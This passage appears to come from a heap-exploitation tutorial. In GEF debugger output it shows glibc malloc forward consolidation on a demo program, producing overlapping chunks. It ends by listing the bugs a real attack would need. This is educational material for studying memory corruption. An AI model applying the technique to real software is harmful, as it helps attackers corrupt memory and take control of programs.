Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────────────────── Unsorted Bin for arena at 0x7ffff7e19c80 ─────────────────────────────
[+] unsorted_bins[0]: fw=0x55555555aad0, bk=0x55555555aad0
 →   Chunk(addr=0x55555555aae0, size=0x490, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 1 chunks in unsorted bin.
────────────────────────────── Small Bins for arena at 0x7ffff7e19c80 ──────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
────────────────────────────── Large Bins for arena at 0x7ffff7e19c80 ──────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  
```

So, we see a few things have happened. First off, since because our our heap header value changes, we consolidated a `0x470` byte chunk into a `0x20` byte chunk, to get a single `0x490` byte chunk, which we see that is the updated value at `0x55555555aad8` (we also see the unsorted bin fwd/bk ptrs). We see the old fake chunk header at `0x55555555af40` has been left. We also see that the `prev_size` of the chunk after our newly consolidated chunk at `0x55555555af60` has been set to `0x490`, to match our newly consolidated chunk

Now let's ask malloc for a chunk of size `0x480` (rounded up to `0x490`) so we can allocate our newly consolidate chunk, and get overlapping memory with the first `0x60` bytes of `chunk2`:

```
gef➤  c
Continuing.
And now, we will reallocate chunk1, with a size of 0x480.

Breakpoint 1, 0x00005555555555ba in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x000055555555aae0  →  0x00007ffff7e19ce0  →  0x000055555555af90  →  0x0000000000000000
$rbx   : 0x0             
$rcx   : 0x31            
$rdx   : 0x0             
$rsp   : 0x00007fffffffdf80  →  0x0000000000000002
$rbp   : 0x00007fffffffdfb0  →  0x0000000000000001
$rsi   : 0x0             
$rdi   : 0x0             
$rip   : 0x00005555555555ba  →  <main+1041> mov QWORD PTR [rbp-0x10], rax
$r8 : 0x0            
$r9 : 0x000055555555aae0  →  0x00007ffff7e19ce0  →  0x000055555555af90  →  0x0000000000000000
$r10   : 0x000055555555af60  →  0x0000000000000490
$r11   : 0x00007ffff7e19ce0  →  0x000055555555af90  →  0x0000000000000000
$r12   : 0x00007fffffffe0c8  →  0x00007fffffffe3cb  →  "/Hackery/shogun/pwn_demos/malloc/fwd_cons[...]"
$r13   : 0x00005555555551a9  →  <main+0> endbr64
$r14   : 0x0000555555558da8  →  0x0000555555555160  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007ffff7ffd040  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf80│+0x0000: 0x0000000000000002   ← $rsp
0x00007fffffffdf88│+0x0008: 0x000055555555a6b0  →  0x0000000000000000
0x00007fffffffdf90│+0x0010: 0x000055555555aae0  →  0x00007ffff7e19ce0  →  0x000055555555af90  →  0x0000000000000000
0x00007fffffffdf98│+0x0018: 0x000055555555af10  →  0x0000000000000000
0x00007fffffffdfa0│+0x0020: 0x0000000000001000
0x00007fffffffdfa8│+0x0028: 0x00005555555550c0  →  <_start+0> endbr64
0x00007fffffffdfb0│+0x0030: 0x0000000000000001   ← $rbp
0x00007fffffffdfb8│+0x0038: 0x00007ffff7c29d90  →  <__libc_start_call_main+128> mov edi, eax
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5555555555ab <main+1026>   call   0x5555555550a0 <printf@plt>
   0x5555555555b0 <main+1031>   mov edi, 0x480
   0x5555555555b5 <main+1036>   call   0x5555555550b0 <malloc@plt>
 → 0x5555555555ba <main+1041>   mov QWORD PTR [rbp-0x10], rax
   0x5555555555be <main+1045>   mov rax, QWORD PTR [rbp-0x10]
   0x5555555555c2 <main+1049>   add rax, 0x2480
   0x5555555555c8 <main+1055>   mov QWORD PTR [rbp-0x8], rax
   0x5555555555cc <main+1059>   mov rax, QWORD PTR [rbp-0x10]
   0x5555555555d0 <main+1063>   mov rsi, rax
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "fwd_consolidati", stopped 0x5555555555ba in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x5555555555ba → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  p $rax
$2 = 0x55555555aae0
gef➤  x/300g 0x55555555a6a0
0x55555555a6a0: 0x0 0x431
0x55555555a6b0: 0x0 0x0
0x55555555a6c0: 0x55555555a6b0  0x55555555a6b0
0x55555555a6d0: 0x0 0x0
0x55555555a6e0: 0x0 0x0
0x55555555a6f0: 0x0 0x0
0x55555555a700: 0x0 0x0
0x55555555a710: 0x0 0x0
0x55555555a720: 0x0 0x0
0x55555555a730: 0x0 0x0
0x55555555a740: 0x0 0x0
0x55555555a750: 0x0 0x0
0x55555555a760: 0x0 0x0
0x55555555a770: 0x0 0x0
0x55555555a780: 0x0 0x0
0x55555555a790: 0x0 0x0
0x55555555a7a0: 0x0 0x0
0x55555555a7b0: 0x0 0x0
0x55555555a7c0: 0x0 0x0
0x55555555a7d0: 0x0 0x0
0x55555555a7e0: 0x0 0x0
0x55555555a7f0: 0x0 0x0
0x55555555a800: 0x0 0x0
0x55555555a810: 0x0 0x0
0x55555555a820: 0x0 0x0
0x55555555a830: 0x0 0x0
0x55555555a840: 0x0 0x0
0x55555555a850: 0x0 0x0
0x55555555a860: 0x0 0x0
0x55555555a870: 0x0 0x0
0x55555555a880: 0x0 0x0
0x55555555a890: 0x0 0x0
0x55555555a8a0: 0x0 0x0
0x55555555a8b0: 0x0 0x0
0x55555555a8c0: 0x0 0x0
0x55555555a8d0: 0x0 0x0
0x55555555a8e0: 0x0 0x0
0x55555555a8f0: 0x0 0x0
0x55555555a900: 0x0 0x0
0x55555555a910: 0x0 0x0
0x55555555a920: 0x0 0x0
0x55555555a930: 0x0 0x0
0x55555555a940: 0x0 0x0
0x55555555a950: 0x0 0x0
0x55555555a960: 0x0 0x0
0x55555555a970: 0x0 0x0
0x55555555a980: 0x0 0x0
0x55555555a990: 0x0 0x0
0x55555555a9a0: 0x0 0x0
0x55555555a9b0: 0x0 0x0
0x55555555a9c0: 0x0 0x0
0x55555555a9d0: 0x0 0x0
0x55555555a9e0: 0x0 0x0
0x55555555a9f0: 0x0 0x0
0x55555555aa00: 0x0 0x0
0x55555555aa10: 0x0 0x0
0x55555555aa20: 0x0 0x0
0x55555555aa30: 0x0 0x0
0x55555555aa40: 0x0 0x0
0x55555555aa50: 0x0 0x0
0x55555555aa60: 0x0 0x0
0x55555555aa70: 0x0 0x0
0x55555555aa80: 0x0 0x0
0x55555555aa90: 0x0 0x0
0x55555555aaa0: 0x0 0x0
0x55555555aab0: 0x0 0x0
0x55555555aac0: 0x0 0x0
0x55555555aad0: 0x0 0x491
0x55555555aae0: 0x7ffff7e19ce0  0x7ffff7e19ce0
0x55555555aaf0: 0x0 0x0
0x55555555ab00: 0x0 0x0
0x55555555ab10: 0x0 0x0
0x55555555ab20: 0x0 0x0
0x55555555ab30: 0x0 0x0
0x55555555ab40: 0x0 0x0
0x55555555ab50: 0x0 0x0
0x55555555ab60: 0x0 0x0
0x55555555ab70: 0x0 0x0
0x55555555ab80: 0x0 0x0
0x55555555ab90: 0x0 0x0
0x55555555aba0: 0x0 0x0
0x55555555abb0: 0x0 0x0
0x55555555abc0: 0x0 0x0
0x55555555abd0: 0x0 0x0
0x55555555abe0: 0x0 0x0
0x55555555abf0: 0x0 0x0
0x55555555ac00: 0x0 0x0
0x55555555ac10: 0x0 0x0
0x55555555ac20: 0x0 0x0
0x55555555ac30: 0x0 0x0
0x55555555ac40: 0x0 0x0
0x55555555ac50: 0x0 0x0
0x55555555ac60: 0x0 0x0
0x55555555ac70: 0x0 0x0
0x55555555ac80: 0x0 0x0
0x55555555ac90: 0x0 0x0
0x55555555aca0: 0x0 0x0
0x55555555acb0: 0x0 0x0
0x55555555acc0: 0x0 0x0
0x55555555acd0: 0x0 0x0
0x55555555ace0: 0x0 0x0
0x55555555acf0: 0x0 0x0
0x55555555ad00: 0x0 0x0
0x55555555ad10: 0x0 0x0
0x55555555ad20: 0x0 0x0
0x55555555ad30: 0x0 0x0
0x55555555ad40: 0x0 0x0
0x55555555ad50: 0x0 0x0
0x55555555ad60: 0x0 0x0
0x55555555ad70: 0x0 0x0
0x55555555ad80: 0x0 0x0
0x55555555ad90: 0x0 0x0
0x55555555ada0: 0x0 0x0
0x55555555adb0: 0x0 0x0
0x55555555adc0: 0x0 0x0
0x55555555add0: 0x0 0x0
0x55555555ade0: 0x0 0x0
0x55555555adf0: 0x0 0x0
0x55555555ae00: 0x0 0x0
0x55555555ae10: 0x0 0x0
0x55555555ae20: 0x0 0x0
0x55555555ae30: 0x0 0x0
0x55555555ae40: 0x0 0x0
0x55555555ae50: 0x0 0x0
0x55555555ae60: 0x0 0x0
0x55555555ae70: 0x0 0x0
0x55555555ae80: 0x0 0x0
0x55555555ae90: 0x0 0x0
0x55555555aea0: 0x0 0x0
0x55555555aeb0: 0x0 0x0
0x55555555aec0: 0x0 0x0
0x55555555aed0: 0x0 0x0
0x55555555aee0: 0x0 0x0
0x55555555aef0: 0x0 0x0
0x55555555af00: 0x0 0x91
0x55555555af10: 0x0 0x0
0x55555555af20: 0x0 0x0
0x55555555af30: 0x0 0x0
0x55555555af40: 0x470   0x21
0x55555555af50: 0x55555555a6b0  0x55555555a6b0
0x55555555af60: 0x490   0x31
0x55555555af70: 0x0 0x0
0x55555555af80: 0x0 0x0
0x55555555af90: 0x0 0x20071
0x55555555afa0: 0x0 0x0
0x55555555afb0: 0x0 0x0
0x55555555afc0: 0x0 0x0
0x55555555afd0: 0x0 0x0
0x55555555afe0: 0x0 0x0
0x55555555aff0: 0x0 0x0
gef➤  heap bins
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
All tcachebins are empty
─────────────────────────────── Fastbins for arena at 0x7ffff7e19c80 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────────────────── Unsorted Bin for arena at 0x7ffff7e19c80 ─────────────────────────────
[+] Found 0 chunks in unsorted bin.
────────────────────────────── Small Bins for arena at 0x7ffff7e19c80 ──────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
────────────────────────────── Large Bins for arena at 0x7ffff7e19c80 ──────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  c
Continuing.
Consolidated Chunk: 0x55555555aae0
Consolidated Chunk End: 0x55555555cf60
Chunk2 (still allocated):   0x55555555af10
Consolidate Chunk encompasses part of Chunk2:   True

Just like that, we were able to get malloc to allocate overlapping chunks via fwd consolidation!
[Inferior 1 (process 31621) exited with code 0141]
```

Just like that, using forward consolidation, we were able to get malloc to allocate the same space of memory multiple times.

In a practical setting, this would require multiple things (in order to do it in the same way). You would need an infoleak bug, in order to know the address space of the heap. In addition to that, you would need a bug to overwrite the header value of `chunk1`. Lastly, you would need to be able to allocate, write to, and then free heap chunks in a helpful way.

Again heap consolidation usually isn't where a heap exploit ends, rather it is one step in the process of heap exploitation.



